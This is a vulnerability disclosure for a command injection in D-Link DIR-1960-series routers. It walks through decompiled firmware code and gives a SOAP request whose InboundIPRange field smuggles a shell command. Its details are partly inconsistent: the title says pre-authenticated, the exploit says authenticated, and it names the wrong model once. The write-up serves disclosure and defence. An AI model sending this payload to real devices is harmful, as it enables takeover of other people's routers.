# D-Link DIR-1960 : HNAP1 SetAdministrationSettings Pre-Authenticated Command Injection


Device : **D-Link DIR-1960, DIR-1360, DIR-2260 & DIR-3060**

Firmware: **1.11B03 Hotfix**

Endpoint: http://purenetworks.com/HNAP1/


## Description of the vulnerability
This vulnerability is present as there are no checks on user input taken from the SetAdministrationSettings action, which is passed to `twsystem`, allowing an attacker to execute arbitary code on the affected installations of the D-Link DIR-878 router.


## Technical Details

### HNAP1

D-Link uses the HNAP1 (Home Network Administration Protocol) which is a SOAP-based protocol. It can be accessed through the http://purenetworks.com/HNAP1/ with a SOAPAction HTTP header to specify the desired operation. **/bin/prog.cgi** is responsible for receiving the incoming requests, and saves the user-given parameters into nvram after processing them. On the other hand, **/bin/rc** reads from nvram then performs the operation that is requested by the user.

**/bin/rc** spawns a UDP server at port 6789, which is used by **/bin/prog.cgi** to notify it whenever there is request made by the user.


### Vulnerability

#### /bin/prog.cgi receives the request

In the **/bin/prog.cgi** binary, at the `SetAdministrationSettings` handler (0x4344cc), the parameters `InboundIPRange` is read from the XML data in the request body, then it is validated by a series of checks. After that, the parameters are saved into nvram as `remotemange_iprange`.

```c
InboundIPRange = (char *)webGetVarString(param_1,"SetAdministrationSettings/InboundIPRange");
...
nvram_safe_set("remotemange_iprange",InboundIPRange);
```

However, the checks do not ensure that `InboundIPRange` does not end with a dangerous string (e.g. `$(cmd)`), which may use to perform a command injection attack. It only checks if the part before the `/` character is a valid IP address, and the integer after `/` is a certain value. For example, `123.123.123.123/32 $(echo gg>/tmp/gg)` is considered valid.

At the end of the function, it calls `serviceApply(1, 0x13)`, which sends a notification of `restart_firewall` to **/bin/rc**.

```c
case 0x13:
    notify_rc("restart_firewall");
    break;
```


#### /bin/rc handles the request

Inside `handle_notifications`, the `restart_firewall` string leads to a call to `load_iptalbes()`.

```c
cmp = strncmp(notif_string_end, "firewall", 8);
// mode == 3 when the notification starts with "restart_"
if (cmp == 0) {
    if ((mode & 2) != 0) {
        load_iptalbes();
        IPv6_REMOTEMANGE_run();
    }
}
```

(Somehow they named the function as `load_iptalbes` lol)

`load_iptalbes` is defined in **/lib/librcm.so**. It calls a series of functions, one of which is `REMOTEMANGE_run()`.

In `REMOTEMANGE_run`, `remotemange_iprange` (saved earlier by **/bin/prog.cgi**) is loaded from nvram. After a series of checks and `sprintf` operations, the value is passed into `twsystem`. An attacker can provide a malicious value for the string (as the example given earlier) to perform a command injection attack.

```c
sprintf(command, "iptables -t nat -A %s ", "REMOTEMANGE_PREROUTING");
ptr = command + strlen(command);

if (...)
{
    sprintf(ptr, "-s %s", remotemange_iprange);
}

...

twsystem(command, 1);
```

## Exploit

After authenticating, send the following SOAP request to http://purenetworks.com/HNAP1/.

```xml
Content-Type: text/xml; charset=utf-8
SOAPAction: http://purenetworks.com/HNAP1/SetAdministrationSettings

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <SetAdministrationSettings xmlns="http://purenetworks.com/HNAP1/">
            <HTTPS>true</HTTPS>
            <RemoteMgt>true</RemoteMgt>
            <RemoteMgtPort>31337</RemoteMgtPort>
            <RemoteMgtHTTPS>true</RemoteMgtHTTPS>
            <InboundFilter>blah</InboundFilter>
            <InboundIPRange>123.123.123.123/32 $(echo gg>/tmp/gg) </InboundIPRange>
        </SetAdministrationSettings>
    </soap:Body>
</soap:Envelope>
```

### Usage

```
$ npm install
$ node app.js
```

Credits: https://github.com/bikerp/dsp-w215-hnap

## Timeline
05th April 2022 - First attempt to notify vendor

07th April 2022 - Second attempt to notify vendor

24th June 2022 - Third attempt to notify vendor

27th June 2022 - FundayFriday release